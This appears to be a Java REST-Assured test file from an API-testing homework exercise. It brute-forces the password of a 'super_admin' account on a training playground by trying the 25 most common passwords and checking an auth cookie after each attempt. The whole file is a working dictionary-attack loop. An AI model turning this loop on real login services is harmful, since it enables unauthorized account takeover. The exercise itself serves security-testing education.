package homework;

import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.*;

public class Ex9 {

    @Test
    public void testSecretPassword() {
        String login = "super_admin";
        Set<String> passwords = Passwords.TOP_25_MOST_COMMON_PASSWORDS;

        Map<String, String> credentials = new HashMap<>();
        credentials.put("login", login);

        Map<String, String> cookies = new HashMap<>();

        for (String password : passwords) {
            credentials.put("password", password);

            System.out.println("Authorization with password: " + password);

            Response response = RestAssured
                    .given()
                    .body(credentials)
                    .when()
                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                    .andReturn();

            String auth_cookie = response.getCookie("auth_cookie");
            cookies.put("auth_cookie", auth_cookie);

            response = RestAssured
                    .given()
                    .cookies(cookies)
                    .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                    .andReturn();

            response.print();

            if (response.body().asString().equals("You are authorized")) {
                System.out.println("==========================");
                System.out.printf("Your password is '%s'%n", password);
                System.out.println("==========================");
                break;
            }
        }
    }
}
